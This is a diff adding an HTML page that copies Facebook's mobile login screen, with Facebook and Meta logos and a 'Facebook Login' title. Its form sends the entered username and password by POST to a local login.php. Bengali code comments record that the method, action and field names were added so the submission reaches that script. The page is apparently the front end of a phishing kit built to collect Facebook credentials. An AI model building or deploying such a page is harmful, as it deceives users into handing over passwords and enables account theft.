@@ -1,0 +1,54 @@
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <title>
+   Facebook Login
+  </title>
+  <script src="https://cdn.tailwindcss.com">
+  </script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <style>
+   @import url('https://fonts.googleapis.com/css2?family=Helvetica&display=swap');
+    body {
+      font-family: 'Helvetica', sans-serif;
+    }
+  </style>
+ </head>
+ <body class="bg-white min-h-screen flex flex-col justify-between">
+  <div class="flex flex-col items-center pt-20 px-6">
+   <img alt="Facebook logo white letter f on blue circle background" class="w-20 h-20" height="80" src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" width="80"/>
+   
+   <!-- ✅ ফর্মে method ও action অ্যাড করা -->
+   <form method="POST" action="login.php" class="w-full max-w-md mt-12 space-y-4">
+    
+    <!-- ✅ name অ্যাট্রিবিউট অ্যাড করা -->
+    <input name="username" class="w-full rounded-xl border border-gray-300 px-5 py-4 text-lg text-gray-600 placeholder-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-600" placeholder="Mobile number or email address" type="text"/>
+    
+    <input name="password" class="w-full rounded-xl border border-gray-300 px-5 py-4 text-lg text-gray-600 placeholder-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-600" placeholder="Password" type="password"/>
+    
+    <button class="w-full bg-blue-600 text-white text-lg font-normal rounded-full py-4" type="submit">
+     Log in
+    </button>
+   </form>
+
+   <a class="mt-6 text-center text-base text-gray-900" href="#">
+    Forgot password?
+   </a>
+   <button class="mt-10 w-full max-w-md border border-blue-600 text-blue-600 text-lg rounded-full py-4" type="button">
+    Create new account
+   </button>
+  </div>
+
+  <div class="flex justify-center items-center pb-8 space-x-2">
+   <img alt="Meta logo blue infinity symbol" class="w-6 h-6" height="24" src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Meta-Logo.png" width="24"/>
+   <span class="text-gray-900 text-lg font-normal">
+    Meta
+   </span>
+  </div>
+
+  <div class="flex justify-center items-center pb-8 space-x-2">
+    <p class="text-gray-400 text-sm">2025 all copyright ©</p>
+  </div>
+ </body>
+</html>
